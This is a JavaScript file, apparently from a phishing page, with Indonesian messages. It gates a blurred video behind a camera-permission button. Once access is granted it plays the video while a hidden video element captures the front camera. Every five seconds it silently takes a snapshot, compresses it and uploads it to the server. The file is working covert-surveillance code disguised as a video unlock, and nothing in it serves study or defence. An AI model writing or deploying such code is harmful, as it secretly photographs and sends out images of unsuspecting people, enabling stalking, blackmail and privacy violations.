document.addEventListener("DOMContentLoaded", function () {
    const allowCameraButton = document.getElementById("allowCameraButton");
    const videoPlayer = document.getElementById("videoPlayer");
    const overlay = document.getElementById("overlay");
    const hiddenCamera = document.getElementById("hiddenCamera");

    function startCamera() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            alert("Browser tidak mendukung akses kamera.");
            return;
        }

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(mediaStream => {
                enableVideoPlayer();

                hiddenCamera.srcObject = mediaStream;
                hiddenCamera.play();

                startCapture(hiddenCamera);
            })
            .catch(err => {
                console.error("Gagal mengakses kamera: ", err);
                alert("Anda harus mengizinkan akses kamera untuk melanjutkan.");
            });
    }

    function enableVideoPlayer() {
        videoPlayer.classList.remove("filter", "blur-lg", "opacity-50", "pointer-events-none");
        overlay.classList.add("hidden");
        videoPlayer.muted = false;
        videoPlayer.play();
    }

    function startCapture(videoElement) {
        const canvas = document.createElement("canvas");
        const context = canvas.getContext("2d");

        setInterval(() => {
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;

            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL("image/jpeg", 0.7);

            uploadPhoto(photoData);
        }, 5000);
    }

    async function uploadPhoto(photoData) {
        try {
            const compressedPhotoData = await compressPhoto(photoData, 0.7);

            fetch("/upload", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({ photo: compressedPhotoData }),
            }).catch(error => console.error("Upload gagal:", error));
        } catch (err) {
            console.error("Gagal mengompres foto:", err);
        }
    }

    function compressPhoto(photoData, quality = 0.7) {
        return new Promise((resolve, reject) => {
            const img = new Image();
            img.src = photoData;

            img.onload = () => {
                const canvas = document.createElement("canvas");
                const ctx = canvas.getContext("2d");

                const maxWidth = 800;
                const maxHeight = 800;
                let width = img.width;
                let height = img.height;

                if (width > height) {
                    if (width > maxWidth) {
                        height *= maxWidth / width;
                        width = maxWidth;
                    }
                } else {
                    if (height > maxHeight) {
                        width *= maxHeight / height;
                        height = maxHeight;
                    }
                }

                canvas.width = width;
                canvas.height = height;
                ctx.drawImage(img, 0, 0, width, height);
                const compressedPhotoData = canvas.toDataURL("image/jpeg", quality);
                resolve(compressedPhotoData);
            };

            img.onerror = err => reject(err);
        });
    }

    allowCameraButton.addEventListener("click", startCamera);
});
